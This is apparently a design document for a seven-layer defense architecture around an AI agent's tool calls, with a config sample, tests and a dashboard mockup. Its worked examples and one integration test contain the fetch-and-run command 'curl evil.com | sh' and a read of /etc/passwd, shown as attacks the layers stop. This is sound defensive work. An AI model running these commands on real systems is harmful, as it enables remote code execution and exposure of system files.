# 67 — The Carapace Defense

A new method for *layered security in depth* — informed by
OpenClaw's sandbox layers and Ember's per-call approval.
The carapace (lobster's shell) as defense metaphor.

---

## What it is

A **layered defense architecture** for tool execution. Each
layer adds protection; failure of one doesn't compromise
all.

Layers (from outer to inner):

1. **Operator approval** (per-call or standing).
2. **Tool framework validation** (schema, types).
3. **Heimdall mediation** (auth, rate limits).
4. **Per-tool sandbox** (path restrictions, robots.txt, etc.).
5. **Process sandbox** (Docker / subprocess / SSH).
6. **Resource limits** (CPU, memory, time).
7. **Audit logging** (forensic record).

Each layer's failure mode is distinct. Penetrating all seven
requires bypassing all seven independently.

---

## Why "carapace"

The lobster's carapace is *multi-layered*:
- Outer cuticle (cuticular layer).
- Epidermis underneath.
- Calcified middle.
- Living tissue below.

Each layer protects differently. The carapace isn't one shell
— it's a *composite*.

Software security in depth works the same way.

---

## Layer-by-layer breakdown

### Layer 1: Operator approval

Already in Ember. Per-call default for risky tools.

Protects against: *unintended* tool invocation by the agent.

Failure mode: operator approves something they shouldn't have.

### Layer 2: Tool framework validation

Schema-validated tool args. Path types are validated. URL types
are validated. Numeric ranges enforced.

Protects against: *malformed* arguments slipping through.

Failure mode: schema doesn't cover edge case.

### Layer 3: Heimdall mediation

Per Yggdrasil: auth + rate limits + circuit breakers.

Protects against: *too-many* calls; *failing* realms; *broken*
authorization.

Failure mode: Heimdall config wrong.

### Layer 4: Per-tool sandbox

`read_local_file` path-prefix sandbox. `fetch_url` robots.txt
+ IDNA + no-private-IP. Each tool has its own conservative
defaults.

Protects against: *escaping intended scope* of tool.

Failure mode: sandbox config wrong; tool intrinsically bypasses
own sandbox.

### Layer 5: Process sandbox (Phase 3+)

Docker / subprocess / SSH isolation.

Protects against: *malicious tool code* doing arbitrary
operations.

Failure mode: sandbox escape (rare; nation-state level).

### Layer 6: Resource limits

CPU time. Memory. Output size. File descriptor count.

Protects against: *runaway resource use* (DoS-style on local
hardware).

Failure mode: limit too generous; allows excessive use.

### Layer 7: Audit logging

Every call recorded. Failures + successes alike.

Protects against: *invisible bad behavior*. Doesn't prevent;
*detects*.

Failure mode: log tampered; full disk preventing write.

---

## The defense math

Single-layer security: if attack succeeds at one layer, success.

Multi-layer (carapace): attacker must succeed at *all* layers.

If each layer is 90% effective (10% bypass rate):
- Single: 10% breach.
- Two: 1%.
- Three: 0.1%.
- Seven: 0.00001%.

Real numbers vary; principle holds. *Composition multiplies
security*.

---

## How each layer behaves on failure

Critical: **failures should be detectable**.

| Layer | Failure → |
|---|---|
| Approval | Operator never sees prompt → tool runs unprompted (BAD) |
| Validation | Malformed args → tool crashes or misbehaves |
| Heimdall | Tool runs without auth/rate-limit (BAD) |
| Per-tool sandbox | Tool accesses outside scope (BAD) |
| Process sandbox | Tool code escapes (very BAD) |
| Resource limits | Tool consumes all resources |
| Audit | Action not recorded (BAD for forensics) |

The "BAD" failures should be **impossible** to achieve
*silently*. Each layer's bypass triggers another layer's
detection.

---

## Defense in depth examples

### Example: malicious shell command

Operator approves `run_shell_command(cmd="curl evil.com | sh")`
without reading.

- Layer 1 (approval): operator approved. ✗ Defense bypassed.
- Layer 2 (validation): cmd is a valid string. ✗ Bypassed.
- Layer 3 (Heimdall): rate-limited. ✗ Bypassed for first call.
- Layer 4 (per-tool): no per-tool sandbox for shell.
- Layer 5 (process sandbox): **Docker container, no network**.
  ✓ Curl fails.
- Layer 6 (resource limits): would timeout anyway.
- Layer 7 (audit): operation logged.

Result: blocked by process sandbox layer. Operator can review
audit log later, see "this happened, was blocked, here's why."

### Example: tool with subtle bug

`read_local_file(path="/etc/passwd")` — operator approves
because path looks innocent.

- Layer 1: approved.
- Layer 4 (per-tool sandbox): path-prefix sandbox to
  ~/notes/. /etc/passwd is OUTSIDE. ✓ Refused.
- Result: refused at per-tool layer; operator sees rejection
  message; can debug why if surprising.

### Example: legitimate tool, unusual usage

Operator approves 50 `fetch_url` calls in quick succession
(scraping a site).

- Layer 1: approved each.
- Layer 3 (Heimdall): rate-limited at 30/min. ✓ 51st call
  refused.
- Result: rate limit kicks in; operator gets feedback.

Each example shows *different layer catching different
problem*.

---

## What this gives Ember

### Confidence to ship more tools

With one-layer defense: every new tool is high-risk.
With seven-layer defense: each new tool is *bounded* in risk.
Easier to add tools knowing they're contained.

### Trust by operator

Operators can verify the defense layers. Audit log shows what
each layer caught. Operators see *the system protecting them*.

### Resilience to bugs

If one layer has a bug, others compensate. We don't need
*perfect* layer; we need *layered*.

---

## What this is NOT

🔴 **Reject** misconceptions:

### 1. Security theater

The layers must *actually function*. Not just exist on paper.
Each layer has tests; bugs in any layer are P0.

### 2. Unbreakable

Nothing is. The carapace is *defense in depth*; not
invulnerability.

### 3. Replaces operator judgment

Even with seven layers, operator should pause before
approving unusual tool calls. Trust + verify.

---

## Configuration shape

```yaml
ember:
  carapace:
    enabled: true
    
    layers:
      operator_approval: true
      tool_validation: true
      heimdall_mediation: true
      per_tool_sandbox: true
      process_sandbox: true       # opt-in Phase 3+
      resource_limits: true
      audit_logging: true
    
    on_layer_failure:
      record_via_verdandi: true
      surface_to_operator: true   # for non-routine failures
      escalate_to_audit: true
```

---

## CI testing per layer

Each layer has dedicated tests:

```
tests/unit/test_carapace_layer_1_approval.py
tests/unit/test_carapace_layer_2_validation.py
tests/unit/test_carapace_layer_3_heimdall.py
tests/unit/test_carapace_layer_4_per_tool_sandbox.py
tests/unit/test_carapace_layer_5_process_sandbox.py
tests/unit/test_carapace_layer_6_resource_limits.py
tests/unit/test_carapace_layer_7_audit.py
```

Plus integration tests verifying *layered* defense:

```python
async def test_carapace_blocks_malicious_shell_at_sandbox():
    """Even if approval is granted, sandbox stops bad shell."""
    operator_approves_all = True
    sandbox_enabled = True
    
    result = await execute_tool(
        "run_shell_command",
        args={"cmd": "curl evil.com | sh"},
        operator_approves_all=operator_approves_all,
    )
    
    # Process sandbox catches the network attempt
    assert result.exit_code != 0
    assert "no network" in result.stderr.lower()
```

---

## What about operator who disables layers

Operators can disable specific layers (`process_sandbox:
false`, e.g.). They take on risk; we document the trade-off.

Default config has all layers enabled. Disabling is *opt-out*.

---

## Visualization in Doctor

```
Carapace defense (last 7 days):

  Layer                   Activations  Catches
  ─────                   ───────────  ───────
  Operator approval        142          12 (denied)
  Tool validation          130          0 (no malformed)
  Heimdall mediation       130          2 (rate-limited)
  Per-tool sandbox         128          5 (path escape attempts)
  Process sandbox          (N/A; no high-power tools yet)
  Resource limits          123          0
  Audit logging            123          123 (all recorded)

No catastrophic catches. Defense layers functioning normally.
```

Operator sees *health of the carapace*.

---

## V3+ ship plan

🟢 **Phase 3 of Klóinn adoption** — when first high-power tool
arrives requiring process sandbox.

Phase 1-2: existing layers (approval, validation, heimdall,
per-tool, audit) are already there. Just *name* them
collectively as "Carapace."

Phase 3+: add layers 5 (process sandbox) + 6 (resource limits).

Phase 4+: refine; add visualizations + per-layer metrics.

---

## Risks + mitigations

| Risk | Mitigation |
|---|---|
| Defense theater (looks good; doesn't work) | Per-layer tests + integration tests |
| Operator disables layers without understanding | Setup wizard explains; warns on disable |
| Performance overhead | Each layer is fast; sum is modest |
| Layer conflict (one breaks another) | Defined ordering; tested in CI |

---

## Closing

The Carapace Defense is **Ember's layered security
architecture**. Seven layers. Each independent. Composition
multiplies safety.

Named for the lobster's multi-layered carapace — defense
without rigidity, each layer adding without complicating the
others.

Phase 3+ ship adds process sandbox + resource limits.
Phase 1-2: name existing layers as "carapace" + document.

This is **security as architecture, not afterthought**.
Klóinn-original method for the codex.
